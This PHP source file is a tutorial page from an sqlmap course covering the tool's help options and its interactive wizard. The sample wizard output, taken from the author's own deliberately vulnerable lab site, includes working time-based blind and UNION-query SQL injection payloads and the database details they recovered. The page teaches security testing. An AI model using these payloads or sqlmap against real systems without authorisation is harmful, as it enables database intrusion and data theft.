<?php
    require_once 'relative_init.php';
    include_once SHARED_PATH . 'course_header.php';
    
    // Title and description are set in page_header.php
    $title = "Sqlmap basic commands";
    $description = "How to get help in Sqlmap.";
    include_once SHARED_PATH . 'page_header.php';

    // Legal disclaimer and terminal animations
    $terminal_text = 'sudo apt-get install -y python3';
    include SHARED_PATH . 'terminal_text.php';
    include_once SHARED_PATH . 'legal_disclaimer.php';
    $terminal_text = 'python3 --version';
    include SHARED_PATH . 'terminal_text.php';

    // Tutorial navigation buttons
    $previous = 'install-sqlmap.php';
    $home = 'sqlmap-course-home.php#tutorials';
    $next = 'find-sql-injection-vulnerabilities.php';
    include SHARED_PATH . 'tutorial_navigation.php';

    // Table of contents
    include SHARED_PATH . 'table_of_contents.php';
?>

    <div class="course-top-level-container">
      <h1 class="title toc">Sqlmap command line help</h1>
      <p>
        Sqlmap provides two separate types of command line help. The first is
        the short version, which is found by providing the <span class="inline-code">&ndash;h</span>.
        The second is a much longer and more comprehensive list of help which is
        output after passing the <span class="inline-code">&ndash;hh</span>
        command line option.
      </p>
      
<pre class="lang-bash default-code-style dark-mode-background">
# Basic help message
python3 sqlmap.py -h

# Advanced help message
python3 sqlmap.py -hh</pre>

      <h1 class="title toc">Sqlmap wizard</h1>
      <p>
        The Sqlmap wizard is an interactive command line interface that will
        walk you through some of the most basic Sqlmap command line parameters.
        Using the Sqlmap wizard, the tool will prompt you for the target URL, 
        optional POST data, and the enumeration method. Use the following command
        to run the wizard.
      </p>

<pre class="lang-bash default-code-style dark-mode-background">
python3 sqlmap.py --wizard</pre>

      <p>
        The default behavior of running the Sqlmap wizard using the default options
        is to find SQL injection points and attempt to exploit the injection points
        to retrieve information about the database such as the DBMS, DBMS version,
        current database user, and current database name. Here is some of the output
        from running the Sqlmap wizard on a website that I coded to be vulnerable
        to SQL injection:
      </p>

<pre class="lang-bash default-code-style dark-mode-background">
sqlmap identified the following injection point(s) with a total of 76 HTTP(s) requests:
---
Parameter: filter (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: filter=hnSB' AND (SELECT 6536 FROM (SELECT(SLEEP(5)))GoYv) AND 'WpKs'='WpKs

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: filter=hnSB' UNION ALL SELECT 64,CONCAT(0x7171707871,0x616e47446f4f564f6664764c4472554b7851776c63756c584b576476596d55624a6c62656478766c,0x717a706a71)-- -
---
do you want to exploit this SQL injection? [Y/n] Y
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
banner: '10.3.34-MariaDB-0+deb10u1'
current user: 'sql_inject@localhost'
current database: 'sql_injection_labs'
current user is DBA: False</pre>

      <p>
        Sqlmap found a vulnerable POST parameter called <span class="inline-code">filter</span>.
        The indented part of the output is information on how Sqlmap found the
        vulnerable parameter. Near the bottom, we see that Sqlmap exploited the
        <span class="inline-code">filter</span> parameter to obtain the back-end
        DBMS (MariaDB), banner, current user is <span class="inline-code">sql_inject</span>,
        the current database is <span class="inline-code">sql_injection_labs</span>,
        and finally that the user <span class="inline-code">sql_inject</span> is not
        a database administrator (<span class="inline-code">current user is DBA: False</span>).
      </p>
    </div>

    <?php include SHARED_PATH . 'tutorial_navigation.php'; ?>
    <div class="course-top-level-container">
    <?php
        $tags = array(
            'Sqlmap',
            'Python3',
            'Debian Linux',
            'Bash'
        );
        
        generate_technology_tags($tags);
    ?>
    </div>

<?php require_once SHARED_PATH . 'page_footer.php'; ?>